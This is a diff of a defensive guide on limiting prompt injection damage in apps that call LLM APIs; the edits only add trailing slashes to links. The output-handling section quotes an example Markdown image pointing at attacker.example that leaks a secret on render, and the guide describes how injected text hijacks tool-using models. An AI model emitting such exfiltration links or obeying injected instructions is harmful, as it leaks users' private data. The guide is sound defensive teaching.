@@ -31,7 +31,7 @@ faqs:
 
 Every AI feature in a vibe-coded app has the same weak point: the model cannot reliably tell your instructions apart from instructions hidden in the text it reads. That is prompt injection, and OWASP ranks it first in its [Top 10 for LLM applications](https://genai.owasp.org/llmrisk/llm01-prompt-injection/). There is no single line of code that fixes it. What you can do is make sure a hijacked model cannot do much damage.
 
-This guide is for apps that call OpenAI, Anthropic, Gemini, or similar from a server route or Supabase Edge Function. If your AI route is not yet behind auth and rate limits, start with [rate limit AI API routes](/guides/rate-limit-ai-api-routes-nextjs-supabase).
+This guide is for apps that call OpenAI, Anthropic, Gemini, or similar from a server route or Supabase Edge Function. If your AI route is not yet behind auth and rate limits, start with [rate limit AI API routes](/guides/rate-limit-ai-api-routes-nextjs-supabase/).
 
 ## How it happens in real apps
 
@@ -46,13 +46,13 @@ Simon Willison calls the worst case the [lethal trifecta](https://simonwillison.
 
 Assume the system prompt is public.
 
-- No API keys, database URLs, internal URLs, or other users' data in the prompt. Keep keys in server environment variables, as in [keep secrets out of frontend code](/guides/keep-secrets-out-of-frontend-code).
+- No API keys, database URLs, internal URLs, or other users' data in the prompt. Keep keys in server environment variables, as in [keep secrets out of frontend code](/guides/keep-secrets-out-of-frontend-code/).
 - Do not enforce business rules by asking the model. "Never give more than 10% discount" belongs in code that checks the final price, not in a sentence the model may ignore.
 - Fix the model, system prompt, and output limits on the server. Never let the request body choose them.
 
 ## 2. Give tools the user's permissions, not yours
 
-The biggest mistake in AI agents is running tools with an admin key. If the model calls a tool through a Supabase client built with the secret or `service_role` key, Row Level Security is bypassed and the model can reach every user's rows. See [Supabase anon key vs service role key](/guides/supabase-anon-key-vs-service-role-key).
+The biggest mistake in AI agents is running tools with an admin key. If the model calls a tool through a Supabase client built with the secret or `service_role` key, Row Level Security is bypassed and the model can reach every user's rows. See [Supabase anon key vs service role key](/guides/supabase-anon-key-vs-service-role-key/).
 
 Instead, build the tool's database client from the signed-in user's session, so RLS limits what any tool call can touch, and take the user id from the verified session, never from the model's arguments:
 
@@ -81,7 +81,7 @@ Rules for tools:
 - **Fewest tools possible.** Each tool is something injected text can trigger.
 - **Narrow tools.** `get_my_orders` is safer than `run_sql` or `fetch_any_url`.
 - **Validate every argument in code** with a schema (for example Zod), the same as untrusted form input. OWASP recommends handling privileged functions in code rather than giving them to the model.
-- **Same authorization as the rest of your app.** If a user cannot do it by clicking, the model cannot do it for them. The [IDOR guide](/guides/idor-broken-object-level-authorization-nextjs-supabase) covers the owner checks.
+- **Same authorization as the rest of your app.** If a user cannot do it by clicking, the model cannot do it for them. The [IDOR guide](/guides/idor-broken-object-level-authorization-nextjs-supabase/) covers the owner checks.
 
 ## 3. Confirm before anything consequential
 
@@ -91,7 +91,7 @@ For actions that send, pay, delete, share, or change permissions, the model shou
 
 Model output can contain whatever the injected text asked for, so handle it like user input ([OWASP: improper output handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)):
 
-- **No raw HTML.** Do not render model output with `dangerouslySetInnerHTML` or `v-html`. Use a Markdown renderer with raw HTML disabled, or sanitize it ([XSS in React and Next.js](/guides/xss-dangerouslysetinnerhtml-markdown-ai-output-react-nextjs) shows react-markdown, rehype-sanitize, and DOMPurify setups). A [Content-Security-Policy](/guides/csp-content-security-policy-vibe-coded-apps) adds a backstop.
+- **No raw HTML.** Do not render model output with `dangerouslySetInnerHTML` or `v-html`. Use a Markdown renderer with raw HTML disabled, or sanitize it ([XSS in React and Next.js](/guides/xss-dangerouslysetinnerhtml-markdown-ai-output-react-nextjs/) shows react-markdown, rehype-sanitize, and DOMPurify setups). A [Content-Security-Policy](/guides/csp-content-security-policy-vibe-coded-apps/) adds a backstop.
 - **Watch images and links.** A Markdown image like `![x](https://attacker.example/log?d=SECRET)` sends data out the moment it renders, with no click. If the model has seen private data, either do not render remote images from model output or allow only your own domains. Show the full destination of links.
 - **Never execute it.** Do not pass model output to `eval`, a shell, raw SQL, or a file path.
 - **Validate structured output.** If you ask for JSON, use the provider's structured output feature and also parse it with a schema in your code. Reject anything that does not fit.
@@ -121,7 +121,7 @@ This lowers the success rate. It does not make injection impossible, which is wh
 ## 6. Log, limit, and watch
 
 - Log tool calls with the user id, tool name, and arguments (not secrets) so you can see abuse.
-- Rate limit per user, as in the [rate limiting guide](/guides/rate-limit-ai-api-routes-nextjs-supabase). Injection attempts are often scripted.
+- Rate limit per user, as in the [rate limiting guide](/guides/rate-limit-ai-api-routes-nextjs-supabase/). Injection attempts are often scripted.
 - Use the provider's moderation tools where they fit your feature, as suggested in [OpenAI safety best practices](https://platform.openai.com/docs/guides/safety-best-practices).
 
 ## Test your own feature
